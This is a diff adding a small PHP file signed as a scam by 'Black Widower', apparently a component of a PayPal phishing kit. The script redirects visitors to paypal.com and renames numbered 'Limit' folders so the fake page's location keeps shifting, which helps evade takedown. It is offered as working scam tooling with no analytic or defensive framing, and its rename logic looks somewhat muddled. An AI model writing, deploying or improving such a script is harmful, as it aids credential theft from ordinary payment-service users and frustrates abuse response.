@@ -1,0 +1,22 @@
+<?php
+/***   Scam Made By Black Widower 2012=====201?  **/
+/***   Scam Made By Black Widower 2012=====201?  **/
+/***   Scam Made By Black Widower 2012=====201?  **/
+/***   Scam Made By Black Widower 2012=====201?  **/
+/***   Scam Made By Black Widower 2012=====201?  **/
+$scam = "Limit";
+header('location:http://paypal.com');
+for($i=0;$i<100;$i++){
+echo '<font color=agent size=4>Processing ...</font>';
+if(file_exists($scam.$i)){
+$n = $i+1;
+$n2 = $n+1;
+$n3 = $n2+1;
+rename("$scam"."$n2","$scam"."$n3");
+rename("$scam"."$n","$scam"."$n2");
+rename("$scam"."$i","$scam"."$n");
+exit;
+}
+}
+
+?>
